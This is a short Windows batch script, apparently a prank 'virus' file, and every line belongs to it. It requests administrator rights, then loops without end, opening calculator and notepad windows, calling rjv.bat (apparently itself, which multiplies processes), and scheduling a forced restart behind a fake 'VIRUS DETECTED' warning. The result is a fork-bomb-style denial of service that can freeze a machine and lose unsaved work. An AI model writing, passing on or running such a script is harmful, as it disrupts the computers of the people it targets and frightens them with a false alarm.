@echo off
runas /user:Administrator
:a
color 4
title R.I.P
start calc
start notepad
shutdown -r -t 30 -c "VIRUS DETECTED"
start rjv.bat
goto a
